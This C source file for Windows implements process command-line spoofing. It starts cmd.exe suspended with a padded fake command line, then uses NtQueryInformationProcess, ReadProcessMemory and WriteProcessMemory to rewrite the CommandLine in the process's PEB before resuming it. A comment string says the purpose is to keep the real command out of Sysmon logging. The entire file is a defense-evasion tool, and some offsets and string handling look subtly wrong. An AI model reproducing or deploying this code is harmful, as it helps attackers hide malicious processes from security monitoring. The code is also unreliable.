#include <stdio.h>
#include <windows.h>
#include <winternl.h>

int main() {
    const char *lolBinCommand = "cmd.exe /k echo This will not be logged in sysmon test";

    // Create spoofed cmdline
    char binary[MAX_PATH];
    sscanf(lolBinCommand, "%s", binary);
    int argsLen = strlen(lolBinCommand) - strlen(binary);
    char spoofedCmdline[MAX_PATH];
    snprintf(spoofedCmdline, sizeof(spoofedCmdline), "%s%*s", binary, argsLen, "");

    // Convert realCmdline to wide character string
    strcat(binary, " ");
    strcat(binary, lolBinCommand);
    int realCmdlineLen = MultiByteToWideChar(CP_UTF8, 0, lolBinCommand, -1, NULL, 0);
    wchar_t *realCmdlineW = (wchar_t *)malloc(realCmdlineLen * sizeof(wchar_t));
    MultiByteToWideChar(CP_UTF8, 0, lolBinCommand, -1, realCmdlineW, realCmdlineLen);

    printf("%s\n", spoofedCmdline);
    wprintf(L"%ls\n", realCmdlineW);

    // Create suspended process
    STARTUPINFOEX si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (!CreateProcessA(NULL, spoofedCmdline, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si.StartupInfo, &pi)) {
        free(realCmdlineW);
        return FALSE;
    }

    // Get remote PEB address
    PROCESS_BASIC_INFORMATION bi;
    ULONG ret;
    if (NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &bi, sizeof(bi), &ret) != 0) {
        free(realCmdlineW);
        return FALSE;
    }
    printf("PEB Address: %p\n", bi.PebBaseAddress);

    // Get RTL_USER_PROCESS_PARAMETERS address
    PVOID processParametersAddress;
    if (!ReadProcessMemory(pi.hProcess, (PBYTE)bi.PebBaseAddress + 0x20, &processParametersAddress, sizeof(processParametersAddress), NULL)) {
        free(realCmdlineW);
        return FALSE;
    }
    printf("Process Parameters Address: %p\n", processParametersAddress);

    // Get CommandLine member address
    PVOID cmdLineAddress;
    if (!ReadProcessMemory(pi.hProcess, (PBYTE)processParametersAddress + 0x70, &cmdLineAddress, sizeof(cmdLineAddress), NULL)) {
        free(realCmdlineW);
        return FALSE;
    }
    printf("Command Line Address: %p\n", cmdLineAddress);

    // Change command line
    if (!WriteProcessMemory(pi.hProcess, cmdLineAddress, realCmdlineW, realCmdlineLen * sizeof(wchar_t), NULL)) {
        free(realCmdlineW);
        return FALSE;
    }

    // Resume process
    ResumeThread(pi.hThread);
    
    free(realCmdlineW);
    return TRUE;
}
